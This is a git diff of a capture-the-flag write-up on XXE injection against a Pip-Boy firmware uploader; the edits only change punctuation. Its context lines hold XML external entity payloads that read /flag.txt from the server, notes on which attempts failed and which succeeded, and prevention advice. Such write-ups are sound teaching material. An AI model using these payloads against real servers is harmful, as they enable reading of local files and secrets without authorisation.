@@ -5,7 +5,7 @@ category: "Web"
 difficulty: "Very Easy"
 date: 2025-08-15
 techniques: ["XXE Injection", "Local File Inclusion", "XML Parsing"]
-description: "XXE injection on a Fallout-themed Pip-Boy ROM firmware uploader — reading /flag.txt off the server filesystem via XML external entities."
+description: "XXE injection on a Fallout-themed Pip-Boy ROM firmware uploader, reading /flag.txt off the server filesystem via XML external entities."
 lang: en
 translation_key: jailbreak
 ---
@@ -41,7 +41,7 @@ The server parses user-supplied XML without disabling external entities. This al
 
 ## Exploitation
 
-### Attempt 1 — With encoding declaration
+### Attempt 1. With encoding declaration
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
@@ -49,7 +49,7 @@ The server parses user-supplied XML without disabling external entities. This al
 ```
 **Result:** Server rejected the encoding declaration.
 
-### Attempt 2 — Entity in Description field
+### Attempt 2. Entity in Description field
 ```xml
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>
 <FirmwareUpdateConfig>
@@ -57,9 +57,9 @@ The server parses user-supplied XML without disabling external entities. This al
     <Description>&xxe;</Description>
     ...
 ```
-**Result:** No output — Description field is not reflected in response.
+**Result:** No output. Description field is not reflected in response.
 
-### Attempt 3 — Entity in multiple fields (SUCCESS)
+### Attempt 3. Entity in multiple fields (SUCCESS)
 ```xml
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///flag.txt">
@@ -88,8 +88,8 @@ The **Version** field was reflected in the server's response message.
 
 ## Key Takeaways
 
-- **XML input = test XXE** — it's almost a reflex in web security
-- **Not all fields reflect output** — test `&xxe;` in multiple fields simultaneously
+- **XML input = test XXE**, it's almost a reflex in web security
+- **Not all fields reflect output**, test `&xxe;` in multiple fields simultaneously
 - **Remove `<?xml?>` declaration** if the server rejects it
 - **`SYSTEM "file:///"` reads local files** through the XML parser
 - Prevention: disable DTDs and external entities in the XML parser
